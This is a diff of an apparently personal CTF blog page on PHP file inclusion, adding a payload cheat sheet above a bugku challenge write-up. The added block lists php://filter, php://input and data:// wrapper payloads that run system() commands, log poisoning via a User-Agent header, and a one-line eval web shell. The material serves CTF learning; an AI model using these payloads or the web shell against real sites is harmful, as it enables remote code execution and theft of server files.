@@ -312,7 +312,7 @@ if (! empty($_REQUEST[&#39;file&#39;])
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-28 15:11:01" itemprop="dateModified" datetime="2021-03-28T15:11:01+08:00">2021-03-28</time>
+                <time title="Modified: 2021-07-22 16:11:33" itemprop="dateModified" datetime="2021-07-22T16:11:33+08:00">2021-07-22</time>
               </span>
 
           
@@ -326,7 +326,13 @@ if (! empty($_REQUEST[&#39;file&#39;])
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>刚起步，遇到两个 文件包含 的题目<br>先附上CSDN看到的关于文件包含的讲解<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37133717/article/details/94631028">https://blog.csdn.net/qq_37133717/article/details/94631028</a>    </p>
+          <p>php伪协议实现命令执行的七种姿势</p>
+<pre><code>https://www.freebuf.com/column/148886.html</code></pre>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">filter:</span><br><span class="line"></span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input:</span><br><span class="line"></span><br><span class="line">?flie&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">&lt;?php system(&#39;ls&#39;);?&gt;  &lt;?php system(&#39;cat flag.php(base64)&#39;);?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data:</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D;</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D; system(&quot;cat fla*&quot;);?&gt;</span><br><span class="line"></span><br><span class="line">日志文件：</span><br><span class="line">?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br><span class="line"></span><br><span class="line">一句话木马：</span><br><span class="line">&lt;?php eval($_POST[cmd]);?&gt;</span><br><span class="line"></span><br><span class="line">User-Agent: &lt;?php system(&#39;cat fl0g.php&#39;);?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>利用session.upload_progress进行文件包含和反序列化渗透</p>
+<pre><code>https://www.freebuf.com/vuls/202819.html</code></pre>
+<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>刚起步，遇到两个 文件包含 的题目<br>先附上CSDN看到的关于文件包含的讲解<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37133717/article/details/94631028">https://blog.csdn.net/qq_37133717/article/details/94631028</a>    </p>
 <h2 id="bugku-6-文件包含-本地包含"><a href="#bugku-6-文件包含-本地包含" class="headerlink" title="bugku-6.文件包含-本地包含"></a>bugku-6.文件包含-本地包含</h2><p>CSDN大佬讲解：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39431542/article/details/88628225">本地文件包含漏洞详解</a><br>第二行可知，flag在flag.php里，倒数第二行show_source(<strong>FILE</strong>)很明显的提示<br>$_REQUEST[]支持get、post两种方式发送过来的请求，很明显接收了hello参数的值，<br>var_dump()函数 显示关于一个或多个表达式的结构信息，包括表达式的类型与值；数组将递归展开值，通过缩进显示其结构<br>eval()函数把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。<br>show_source() 函数对文件进行语法显示,是 highlight_file() 的别名</p>
 <blockquote>
 <p>本题代码如下</p>
@@ -959,7 +965,7 @@ if (! empty($_REQUEST[&#39;file&#39;])
         <span class="site-state-item-name">categories</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
